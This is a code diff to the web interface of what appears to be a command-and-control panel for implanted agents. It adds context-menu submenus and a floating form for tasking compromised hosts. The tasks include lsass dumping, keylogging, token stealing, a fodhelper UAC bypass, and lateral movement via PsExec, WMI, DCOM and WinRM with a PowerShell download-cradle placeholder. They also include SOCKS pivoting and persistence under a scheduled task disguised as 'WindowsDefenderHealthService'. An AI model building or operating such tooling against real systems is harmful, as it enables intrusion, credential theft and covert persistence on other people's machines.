@@ -273,13 +273,30 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 .upload-zone:hover,.upload-zone.drag{border-color:var(--accent);color:var(--accent)}
 .upload-zone input[type=file]{display:none}
 /* ── Context menu ── */
-#ctx-menu{position:fixed;z-index:9999;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;padding:4px 0;min-width:190px;box-shadow:0 6px 24px rgba(0,0,0,.7);display:none;pointer-events:auto}
+#ctx-menu{position:fixed;z-index:9999;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;padding:4px 0;min-width:200px;box-shadow:0 6px 24px rgba(0,0,0,.7);display:none;pointer-events:auto}
 #ctx-menu.open{display:block}
-.ctx-item{padding:6px 14px;font-size:12px;cursor:pointer;color:var(--text);white-space:nowrap;display:flex;align-items:center;gap:8px;user-select:none}
+.ctx-item{padding:5px 14px 5px 12px;font-size:12px;cursor:pointer;color:var(--text);white-space:nowrap;display:flex;align-items:center;gap:7px;user-select:none;position:relative}
 .ctx-item:hover{background:rgba(0,212,255,.1);color:var(--accent)}
 .ctx-item.danger:hover{background:rgba(255,68,68,.1);color:var(--red)}
 .ctx-sep{height:1px;background:var(--border);margin:3px 8px}
-.ctx-header{padding:4px 14px 2px;font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;user-select:none}
+.ctx-header{padding:5px 12px 3px;font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;user-select:none;font-weight:600}
+.ctx-item.has-sub{padding-right:22px}
+.ctx-item.has-sub::after{content:'▸';position:absolute;right:9px;opacity:.5;font-size:10px}
+.ctx-item.has-sub:hover::after{opacity:1}
+.ctx-submenu{position:absolute;left:100%;top:-4px;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;padding:4px 0;min-width:200px;box-shadow:0 6px 24px rgba(0,0,0,.7);display:none;z-index:10001;pointer-events:auto}
+.ctx-item.has-sub:hover>.ctx-submenu{display:block}
+/* quick form floating panel */
+#ctx-quick-form{position:fixed;z-index:10002;background:var(--bg3);border:1px solid var(--border2);border-radius:7px;padding:14px 16px;min-width:270px;max-width:320px;box-shadow:0 8px 32px rgba(0,0,0,.8);display:none}
+#ctx-quick-form.open{display:block}
+#ctx-quick-form h4{color:var(--accent);font-size:10px;margin:0 0 10px;font-family:var(--font-mono);text-transform:uppercase;letter-spacing:1px}
+#ctx-quick-form .qf-row{margin-bottom:7px}
+#ctx-quick-form label{display:block;color:var(--text3);font-size:10px;margin-bottom:2px}
+#ctx-quick-form input,#ctx-quick-form select{width:100%;background:var(--bg2);border:1px solid var(--border);border-radius:3px;color:var(--text);font-size:11px;padding:4px 7px;font-family:var(--font-mono);box-sizing:border-box;outline:none}
+#ctx-quick-form input:focus,#ctx-quick-form select:focus{border-color:var(--accent)}
+#ctx-quick-form .qf-btns{display:flex;gap:6px;margin-top:10px}
+#ctx-quick-form .qf-btns button{flex:1;padding:5px;border:none;border-radius:4px;font-size:11px;cursor:pointer;font-family:var(--font-mono)}
+#ctx-quick-form .qf-go{background:var(--accent);color:#000;font-weight:700}
+#ctx-quick-form .qf-cancel{background:var(--bg2);border:1px solid var(--border);color:var(--text2)}
 /* ── Process table (inside console) ── */
 .ps-table{width:100%;border-collapse:collapse;font-size:11px;font-family:var(--font-mono);margin:2px 0}
 .ps-table th{padding:3px 8px;text-align:left;font-size:10px;color:var(--text3);text-transform:uppercase;border-bottom:1px solid var(--border);background:var(--bg3)}
@@ -2026,6 +2043,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 </div>
 
 <div id="ctx-menu"></div>
+<div id="ctx-quick-form"></div>
 
 <!-- Prompt modal (single input) -->
 <div class="modal-overlay" id="modal-prompt" style="display:none">
@@ -2214,19 +2232,41 @@ let graphEdgeMode = localStorage.getItem('c2_graph_edge') || 'animated';
 // ── Context Menu System ────────────────────────────────────────────────────────
 const ctxMenu = document.getElementById ? (() => document.getElementById('ctx-menu'))() : null;
 
+function _renderCtxItems(items) {
+  return items.map(it => {
+    if (it === null) return '<div class="ctx-sep"></div>';
+    if (it._header) return `<div class="ctx-header">${esc(it._header)}</div>`;
+    if (it._sub) {
+      return `<div class="ctx-item has-sub">${esc(it._sub)}<div class="ctx-submenu">${_renderCtxItems(it.items)}</div></div>`;
+    }
+    return `<div class="ctx-item${it.danger?' danger':''}" data-action='${JSON.stringify(it.action)}'>${it.label}</div>`;
+  }).join('');
+}
+
 function showCtxMenu(e, items) {
   e.preventDefault();
   e.stopPropagation();
+  closeQuickForm();
   const m = document.getElementById('ctx-menu');
-  m.innerHTML = items.map(it => {
-    if (it === null) return '<div class="ctx-sep"></div>';
-    if (it._header) return `<div class="ctx-header">${esc(it._header)}</div>`;
-    return `<div class="ctx-item${it.danger?' danger':''}" data-action='${JSON.stringify(it.action)}'>${it.label}</div>`;
-  }).join('');
-  m.querySelectorAll('.ctx-item').forEach(el => {
-    el.addEventListener('click', () => {
+  m.innerHTML = _renderCtxItems(items);
+  m.querySelectorAll('.ctx-item[data-action]').forEach(el => {
+    el.addEventListener('click', ev => {
+      ev.stopPropagation();
       hideCtxMenu();
       runCtxAction(JSON.parse(el.dataset.action));
+    });
+  });
+  // Adjust submenu side on open based on available space
+  m.querySelectorAll('.ctx-item.has-sub').forEach(el => {
+    el.addEventListener('mouseenter', () => {
+      const sub = el.querySelector('.ctx-submenu');
+      if (!sub) return;
+      const rect = el.getBoundingClientRect();
+      if (rect.right + 205 > window.innerWidth) {
+        sub.style.left = 'auto'; sub.style.right = '100%';
+      } else {
+        sub.style.left = '100%'; sub.style.right = 'auto';
+      }
     });
   });
   const vw = window.innerWidth, vh = window.innerHeight;
@@ -2245,7 +2285,57 @@ function hideCtxMenu() {
   document.querySelectorAll('.ctx-active').forEach(r => r.classList.remove('ctx-active'));
 }
 
-document.addEventListener('click',   hideCtxMenu);
+// ── Quick floating form (lateral movement, privesc) ───────────────────────────
+function showQuickForm(title, fields, onSubmit) {
+  const f = document.getElementById('ctx-quick-form');
+  let html = `<h4>${esc(title)}</h4>`;
+  fields.forEach(fd => {
+    html += `<div class="qf-row"><label>${esc(fd.label)}</label>`;
+    if (fd.type === 'select') {
+      html += `<select id="qf_${fd.key}">${fd.options.map(o=>`<option value="${esc(o.v)}">${esc(o.l)}</option>`).join('')}</select>`;
+    } else {
+      html += `<input id="qf_${fd.key}" type="${fd.type||'text'}" value="${esc(fd.def||'')}" placeholder="${esc(fd.ph||'')}">`;
+    }
+    html += '</div>';
+  });
+  html += `<div class="qf-btns">
+    <button class="qf-go" onclick="submitQuickForm()">▶ Execute</button>
+    <button class="qf-cancel" onclick="closeQuickForm()">Cancel</button>
+  </div>`;
+  f.innerHTML = html;
+  f._submit = () => {
+    const vals = {};
+    fields.forEach(fd => { vals[fd.key] = document.getElementById('qf_'+fd.key)?.value||''; });
+    closeQuickForm();
+    onSubmit(vals);
+  };
+  f.classList.add('open');
+  const vw = window.innerWidth, vh = window.innerHeight;
+  f.style.left = Math.max(8, Math.min(vw - 330, vw/2 - 140)) + 'px';
+  f.style.top  = Math.max(8, Math.min(vh - 320, vh/2 - 120)) + 'px';
+  setTimeout(() => f.querySelector('input,select')?.focus(), 40);
+  f.addEventListener('keydown', _qfKeydown);
+}
+function _qfKeydown(e) {
+  if (e.key === 'Enter') submitQuickForm();
+  if (e.key === 'Escape') closeQuickForm();
+}
+function submitQuickForm() {
+  const f = document.getElementById('ctx-quick-form');
+  if (f?._submit) f._submit();
+}
+function closeQuickForm() {
+  const f = document.getElementById('ctx-quick-form');
+  if (!f) return;
+  f.classList.remove('open');
+  f.removeEventListener('keydown', _qfKeydown);
+}
+
+document.addEventListener('click', e => {
+  hideCtxMenu();
+  const qf = document.getElementById('ctx-quick-form');
+  if (qf?.classList.contains('open') && !qf.contains(e.target)) closeQuickForm();
+});
 document.addEventListener('keydown', e => {
   if (e.key === 'Escape') {
     hideCtxMenu();
@@ -2362,10 +2452,106 @@ async function runCtxAction(act) {
     case 'persistTask': {
       const aid = act.id || activeAgent?.id;
       if (!aid) break;
-      showPrompt('Persistencia', 'Nombre de la tarea programada', 'WindowsDefenderHealthService', name => {
+      showPrompt('Persistence', 'Scheduled task name', 'WindowsDefenderHealthService', name => {
         api('POST', `/api/agents/${aid}/task`, {type:'PERSIST_TASK', args:name})
           .then(r => { if (r?.ok) toast(`PERSIST_TASK: ${name}`); });
       });
+      break;
+    }
+    case 'lateralMove': {
+      const aid = act.id || activeAgent?.id;
+      if (!aid) break;
+      const agnt = agents.find(x => x.id === aid);
+      const method = act.method;
+      const labels = {psexec:'PSExec',wmi:'WMI',dcom:'DCOM',atexec:'AtExec',smbexec:'SMBExec',ssh:'SSH','winrm-exec':'WinRM Exec','winrm-deploy':'WinRM Deploy'};
+      // Get uploaded .exe files for payload dropdown
+      const uploadR = await api('GET', '/api/uploads');
+      const exeFiles = (uploadR?.ok ? uploadR.data||[] : [])
+        .filter(f => f.filename?.match(/\.(exe|bin|ps1)$/i) && !f.agent_id)
+        .map(f => ({v: f.filename, l: f.filename}));
+      exeFiles.unshift({v:'', l:'— select payload —'});
+
+      const isWinRM = method.startsWith('winrm');
+      const baseFields = [
+        {key:'host', label:'Target host / IP', def: agnt?.ip||'', ph:'10.10.10.x'},
+        {key:'user', label:'Username', def:'', ph:'DOMAIN\\user'},
+        {key:'pass', label:'Password', type:'password', ph:''},
+      ];
+      let extraFields = [];
+      if (method === 'winrm-exec') {
+        extraFields = [{key:'cmd', label:'Command', def:'whoami', ph:'whoami'}];
+      } else if (method === 'winrm-deploy') {
+        extraFields = [{key:'cradle', label:'PowerShell cradle', ph:'IEX(New-Object Net.WebClient).DownloadString(...)'}];
+      } else {
+        extraFields = [{key:'payload', label:'Payload (.exe)', type:'select', options: exeFiles}];
+      }
+
+      showQuickForm(`⚡ ${labels[method]||method}`, [...baseFields, ...extraFields], vals => {
+        if (!vals.host) { toast('Host required','red'); return; }
+        let cmdLine;
+        if (method === 'winrm-exec') {
+          cmdLine = `winrm exec ${vals.host} ${vals.user} ${vals.pass} ${vals.cmd}`;
+        } else if (method === 'winrm-deploy') {
+          cmdLine = `winrm deploy ${vals.host} ${vals.user} ${vals.pass} ${vals.cradle}`;
+        } else {
+          if (!vals.payload) { toast('Select a payload','red'); return; }
+          cmdLine = `jump ${method} ${vals.host} ${vals.payload} ${vals.user} ${vals.pass}`;
+        }
+        openConsoleFor(aid);
+        setTimeout(() => dispatchConsoleCmd(aid, cmdLine), 350);
+      });
+      break;
+    }
+    case 'quickPrivesc': {
+      const aid = act.id || activeAgent?.id;
+      if (!aid) break;
+      const privAct = act.act;
+      if (privAct === 'steal-system') {
+        // Steal token from System (PID 4) — always works if SYSTEM
+        const r = await api('POST', `/api/agents/${aid}/task`, {type:'TOKEN_STEAL', args:'4'});
+        if (r?.ok) {
+          toast('TOKEN_STEAL → PID 4 (System)');
+          if (!activeAgent || activeAgent.id !== aid) openConsoleFor(aid);
+          pollResult(r.data?.task_id, aid);
+        }
+      } else if (privAct === 'steal-pid') {
+        showQuickForm('🔑 Steal Token', [
+          {key:'pid', label:'Target PID (run ps first)', def:'', ph:'664'},
+        ], async vals => {
+          if (!vals.pid) return;
+          const r = await api('POST', `/api/agents/${aid}/task`, {type:'TOKEN_STEAL', args:vals.pid});
+          if (r?.ok) {
+            toast(`TOKEN_STEAL → PID ${vals.pid}`);
+            openConsoleFor(aid);
+            pollResult(r.data?.task_id, aid);
+          }
+        });
+      } else if (privAct === 'make-token') {
+        showQuickForm('🔑 Make Token', [
+          {key:'user', label:'Domain\\User', def:'', ph:'CORP\\administrator'},
+          {key:'pass', label:'Password', type:'password', ph:''},
+        ], async vals => {
+          if (!vals.user) return;
+          const r = await api('POST', `/api/agents/${aid}/task`, {type:'TOKEN_MAKE', args:`${vals.user} ${vals.pass}`});
+          if (r?.ok) {
+            toast(`TOKEN_MAKE → ${vals.user}`);
+            openConsoleFor(aid);
+            pollResult(r.data?.task_id, aid);
+          }
+        });
+      } else if (privAct === 'fodhelper') {
+        showQuickForm('⬆️ UAC Bypass (fodhelper)', [
+          {key:'cmd', label:'Command to elevate', def:'cmd.exe', ph:'cmd.exe'},
+        ], async vals => {
+          if (!vals.cmd) return;
+          const r = await api('POST', `/api/agents/${aid}/task`, {type:'ELEVATE', args:`fodhelper ${vals.cmd}`});
+          if (r?.ok) {
+            toast(`UAC bypass → ${vals.cmd}`);
+            openConsoleFor(aid);
+            pollResult(r.data?.task_id, aid);
+          }
+        });
+      }
       break;
     }
   }
@@ -2582,40 +2768,72 @@ function agentContextMenu(e, agentId) {
   document.querySelectorAll('#agents-tbody tr').forEach(r => r.classList.remove('ctx-active'));
   if (e.currentTarget) e.currentTarget.classList.add('ctx-active');
   const id = agentId;
+  const isWin = !a.os?.toLowerCase().includes('linux');
   showCtxMenu(e, [
-    {_header: a.hostname + ' · ' + a.username},
-    {label:'📟  Open Console',       action:{fn:'openConsoleFor', id}},
+    {_header: a.hostname + ' · ' + a.username + (a.ip ? ' · ' + a.ip : '')},
+    {label:'📟  Open Console',       action:{fn:'openConsoleFor',   id}},
     {label:'📂  File Explorer',      action:{fn:'openFileExplorer', id}},
     null,
-    {label:'ℹ️  Sysinfo',            action:{fn:'selectAndTask', id, type:'SYSINFO',      args:''}},
-    {label:'📋  Process List',       action:{fn:'openProcessList', id}},
-    {label:'📸  Screenshot → Loot',  action:{fn:'screenshotToLoot', id}},
-    {label:'📎  Clipboard',          action:{fn:'selectAndTask', id, type:'CLIP_GET',     args:''}},
-    {label:'🔑  Whoami / Token',      action:{fn:'selectAndTask', id, type:'TOKEN_WHOAMI', args:''}},
+    {_sub:'🔎  Recon', items:[
+      {label:'ℹ️  Sysinfo',           action:{fn:'selectAndTask', id, type:'SYSINFO',       args:''}},
+      {label:'📋  Process List',      action:{fn:'openProcessList', id}},
+      {label:'📸  Screenshot → Loot', action:{fn:'screenshotToLoot', id}},
+      {label:'📎  Clipboard (once)',   action:{fn:'selectAndTask', id, type:'CLIP_GET',      args:''}},
+      {label:'🔑  Whoami / Token',     action:{fn:'selectAndTask', id, type:'TOKEN_WHOAMI',  args:''}},
+      ...(isWin ? [{label:'💾  Dump lsass',         action:{fn:'selectAndTask', id, type:'MINIDUMP',    args:''}}] : []),
+    ]},
+    {_sub:'🔍  Port Scan', items:[
+      {label:'Top 100 ports',    action:{fn:'portScan', id, target:a.ip, ports:'21,22,23,25,53,80,88,110,135,139,143,389,443,445,464,593,636,993,995,1433,3268,3306,3389,5985,8080,8443', ms:'300', label:'Top100'}},
+      {label:'SMB / AD ports',   action:{fn:'portScan', id, target:a.ip, ports:'88,135,139,389,445,464,593,636,3268,3269,5985,9389', ms:'300', label:'SMB/AD'}},
+      {label:'Web ports',        action:{fn:'portScan', id, target:a.ip, ports:'80,443,8080,8443,8888,8000,3000,5000', ms:'300', label:'Web'}},
+      {label:'Full TCP (1-65535)',action:{fn:'portScan', id, target:a.ip, ports:'1-65535', ms:'200', label:'FullTCP'}},
+      null,
+      {label:'Custom…',          action:{fn:'portScanCustom', id, srcIp:a.ip}},
+    ]},
+    ...(isWin ? [{_sub:'⚡  Lateral Movement', items:[
+      {label:'PSExec…',            action:{fn:'lateralMove', id, method:'psexec'}},
+      {label:'WMI…',               action:{fn:'lateralMove', id, method:'wmi'}},
+      {label:'DCOM…',              action:{fn:'lateralMove', id, method:'dcom'}},
+      {label:'AtExec…',            action:{fn:'lateralMove', id, method:'atexec'}},
+      {label:'SMBExec…',           action:{fn:'lateralMove', id, method:'smbexec'}},
+      null,
+      {label:'WinRM exec…',        action:{fn:'lateralMove', id, method:'winrm-exec'}},
+      {label:'WinRM deploy…',      action:{fn:'lateralMove', id, method:'winrm-deploy'}},
+      null,
+      {label:'SSH…',               action:{fn:'lateralMove', id, method:'ssh'}},
+    ]},
+    {_sub:'🔐  Privilege Escalation', items:[
+      {label:'Steal SYSTEM token (PID 4)',  action:{fn:'quickPrivesc', id, act:'steal-system'}},
+      {label:'Steal token from PID…',      action:{fn:'quickPrivesc', id, act:'steal-pid'}},
+      {label:'Make Token…',               action:{fn:'quickPrivesc', id, act:'make-token'}},
+      null,
+      {label:'UAC bypass (fodhelper)…',   action:{fn:'quickPrivesc', id, act:'fodhelper'}},
+      null,
+      {label:'Hook Check (EDR)',           action:{fn:'selectAndTask', id, type:'HOOK_CHECK',  args:''}},
+      {label:'HW Breakpoint Check',        action:{fn:'selectAndTask', id, type:'HW_BP_CHECK', args:''}},
+    ]},
+    {_sub:'🎯  Collection', items:[
+      {label:'Keylog Start',         action:{fn:'selectAndTask', id, type:'KEYLOG_START', args:''}},
+      {label:'Keylog Dump',          action:{fn:'selectAndTask', id, type:'KEYLOG_DUMP',  args:''}},
+      {label:'Keylog Stop',          action:{fn:'selectAndTask', id, type:'KEYLOG_STOP',  args:''}},
+    ]},
+    {_sub:'🔒  Persistence', items:[
+      {label:'Run Key (HKCU)',       action:{fn:'selectAndTask', id, type:'PERSIST',    args:''}},
+      {label:'Scheduled Task…',     action:{fn:'persistTask', id}},
+      null,
+      {label:'Remove Persistence',  action:{fn:'selectAndTask', id, type:'PERSIST_RM', args:''}, danger:true},
+    ]}] : []),
+    {_sub:'🧦  Tunnel / Pivot', items:[
+      {label:'SOCKS5 Start…',       action:{fn:'socks5Start', id}},
+      {label:'SOCKS5 Stop',         action:{fn:'selectAndTask', id, type:'SOCKS_STOP', args:''}},
+    ]},
     null,
-    {label:'🔍  Port Scan — Top 100', action:{fn:'portScan', id, target:a.ip, ports:'21,22,23,25,53,80,88,110,135,139,143,389,443,445,464,593,636,993,995,1433,1521,3268,3306,3389,5985,5986,8080,8443,8888,9090', ms:'300', label:'Top100'}},
-    {label:'🔍  Port Scan — Full TCP',action:{fn:'portScan', id, target:a.ip, ports:'1-65535', ms:'200', label:'Full TCP'}},
-    {label:'🔍  Port Scan — SMB/AD',  action:{fn:'portScan', id, target:a.ip, ports:'88,135,139,389,445,464,593,636,3268,3269,5985,9389', ms:'300', label:'SMB/AD'}},
-    {label:'🔍  Port Scan — Web',     action:{fn:'portScan', id, target:a.ip, ports:'80,443,8080,8443,8888,8000,3000,5000', ms:'300', label:'Web'}},
-    {label:'🔍  Port Scan — Custom…', action:{fn:'portScanCustom', id, srcIp:a.ip}},
+    {label:'💤  Sleep 30s ±20%',    action:{fn:'setSleepSec', id, sec:30, jitterSec:6}},
+    {label:'🪙  Rev2Self',          action:{fn:'selectAndTask', id, type:'REV2SELF',  args:''}},
+    {label:'🧹  Cleanup',           action:{fn:'selectAndTask', id, type:'CLEANUP',   args:''}},
     null,
-    {label:'🔒  Keylog Start',       action:{fn:'selectAndTask', id, type:'KEYLOG_START', args:''}},
-    {label:'🔓  Keylog Stop',        action:{fn:'selectAndTask', id, type:'KEYLOG_STOP',  args:''}},
-    {label:'📥  Keylog Dump',        action:{fn:'selectAndTask', id, type:'KEYLOG_DUMP',  args:''}},
-    null,
-    {label:'💤  Sleep 30s/10s',      action:{fn:'setSleepSec', id, sec:30, jitterSec:10}},
-    {label:'🧹  Cleanup',            action:{fn:'selectAndTask', id, type:'CLEANUP',      args:''}},
-    null,
-    {label:'🔒  Persist (Run Key)',   action:{fn:'selectAndTask', id, type:'PERSIST',      args:''}},
-    {label:'📅  Persist (Schtask)',   action:{fn:'persistTask',   id}},
-    {label:'🗑  Remove Persistence', action:{fn:'selectAndTask', id, type:'PERSIST_RM',   args:''}},
-    null,
-    {label:'🧦  SOCKS5 Start',       action:{fn:'socks5Start',   id}},
-    {label:'🛑  SOCKS5 Stop',        action:{fn:'selectAndTask', id, type:'SOCKS_STOP',   args:''}},
-    {label:'🪙  Rev2Self',           action:{fn:'selectAndTask', id, type:'REV2SELF',     args:''}},
-    null,
-    {label:'☠  Kill Agent',         action:{fn:'selectAndTask', id, type:'KILL',          args:''}, danger:true},
-    {label:'🗑  Delete Record',     action:{fn:'deleteAgent',   id}, danger:true},
+    {label:'☠  Kill Agent',         action:{fn:'selectAndTask', id, type:'KILL',      args:''}, danger:true},
+    {label:'🗑  Delete Record',     action:{fn:'deleteAgent',   id},                             danger:true},
   ]);
 }
 
